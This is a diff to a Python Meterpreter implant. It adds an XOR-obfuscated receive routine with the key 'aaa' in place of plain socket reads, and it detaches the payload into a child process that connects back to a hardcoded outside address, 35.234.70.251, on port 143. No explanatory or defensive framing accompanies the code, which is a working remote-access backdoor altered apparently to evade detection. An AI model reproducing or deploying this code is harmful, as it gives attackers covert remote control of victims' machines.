@@ -1,9 +1,10 @@
+import multiprocessing
 import platform, os, code, binascii, random, re, select, socket, struct, sys, time
 
 #
 # import subprocess
 # import threading
-
+from multiprocessing.dummy import freeze_support
 
 try:
     import ctypes
@@ -827,6 +828,7 @@ class HttpTransport(Transport):
             trans_group += tlv_pack(TLV_TYPE_TRANS_PROXY_HOST, self.proxy)
         return trans_group
 
+
 class TcpTransport(Transport):
     def __init__(self, url, socket=None):
         super(TcpTransport, self).__init__()
@@ -834,6 +836,16 @@ class TcpTransport(Transport):
         self.socket = socket
         self._cleanup_thread = None
         self._first_packet = True
+
+    def custome_recv(self,size):
+        try:
+            from itertools import izip, cycle
+            key = 'aaa'
+            buffer = self.socket.recv(size)
+            xored = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in izip(buffer, cycle(key)))
+            return xored
+        except Exception as e:
+            print('Exception')
 
     def _sock_cleanup(self, sock):
         remaining_time = self.communication_timeout
@@ -884,7 +896,7 @@ class TcpTransport(Transport):
         self._first_packet = False
         if not select.select([self.socket], [], [], 0.5)[0]:
             return bytes()
-        packet = self.socket.recv(PACKET_HEADER_SIZE)
+        packet = self.custome_recv(PACKET_HEADER_SIZE)
         if packet == '':  # remote is closed
             self.request_retire = True
             return None
@@ -895,7 +907,7 @@ class TcpTransport(Transport):
                 pkt_length = struct.unpack('>I', header)[0]
                 self.socket.settimeout(max(self.communication_timeout, 30))
                 while received < pkt_length:
-                    received += len(self.socket.recv(pkt_length - received))
+                    received += len(self.custome_recv(pkt_length - received))
                 self.socket.settimeout(None)
                 return self._get_packet()
             return None
@@ -909,7 +921,7 @@ class TcpTransport(Transport):
         # Read the rest of the packet
         rest = bytes()
         while len(rest) < pkt_length:
-            rest += self.socket.recv(pkt_length - len(rest))
+            rest += self.custome_recv(pkt_length - len(rest))
         # return the whole packet, as it's decoded separately
         return packet + rest
 
@@ -1376,22 +1388,30 @@ class PythonMeterpreter(object):
         response += tlv_pack(reqid_tlv)
         return response + tlv_pack(TLV_TYPE_RESULT, result)
 
-_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
-if not _try_to_fork or (_try_to_fork and os.fork() == 0):
-    if hasattr(os, 'setsid'):
-        try:
-            os.setsid()
-        except OSError:
-            pass
-    if HTTP_CONNECTION_URL and has_urllib:
-        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
-                http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
-    else:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        s.connect(('35.234.70.251',143))
+def main():
+    _try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
+    if not _try_to_fork or (_try_to_fork and os.fork() == 0):
+        if hasattr(os, 'setsid'):
+            try:
+                os.setsid()
+            except OSError:
+                pass
+        if HTTP_CONNECTION_URL and has_urllib:
+            transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
+                    http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
+        else:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        transport = TcpTransport.from_socket(s)
-    met = PythonMeterpreter(transport)
-    # PATCH-SETUP-TRANSPORTS #
-    met.run()
+            s.connect(('35.234.70.251',143))
+
+            transport = TcpTransport.from_socket(s)
+        met = PythonMeterpreter(transport)
+        # PATCH-SETUP-TRANSPORTS #
+        met.run()
+
+if __name__ == '__main__':
+    freeze_support()
+    process = multiprocessing.Process(target=main)
+    process.start()
+    os._exit(0)
